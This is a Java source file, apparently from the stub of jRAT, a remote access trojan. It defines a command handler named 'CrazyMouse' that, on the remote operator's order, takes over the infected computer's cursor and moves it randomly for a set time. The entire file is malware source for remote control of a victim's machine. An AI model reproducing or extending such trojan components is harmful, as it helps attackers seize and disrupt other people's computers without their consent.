package se.jrat.stub.packets.incoming;

import java.awt.Rectangle;
import java.awt.Toolkit;
import java.util.Random;

import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet46CrazyMouse extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		final int time = con.readInt();
		new Thread() {
			public void run() {
				try {
					Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
					int height = (int) screenRect.getHeight();
					int width = (int) screenRect.getWidth();
					Random random = new Random();
					for (int i = 0; i < time * 4; i++) {
						ScreenUtils.getDefault().mouseMove(random.nextInt(width), random.nextInt(height));
						Thread.sleep(250L);
					}
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}.start();
	}

}
